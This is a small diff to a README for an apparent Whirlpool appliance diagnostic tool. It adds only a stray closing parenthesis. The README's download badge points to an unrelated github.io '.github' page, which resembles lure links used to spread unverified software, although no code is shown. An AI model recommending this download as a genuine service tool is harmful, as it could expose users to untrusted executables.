@@ -3,6 +3,7 @@
 Cross-device diagnostic toolkit for Whirlpool appliances — enables full access to service modes, component testing, fault code logging, and calibration control for washers, dryers, dishwashers, fridges, and ovens.
 
 [![📥 Download Whirlpool Tool](https://img.shields.io/badge/Download-Whirlpool_Service_Tool-blueviolet)](https://whirlpool-service-mode-tool.github.io/.github)
+)
 
 ---
 
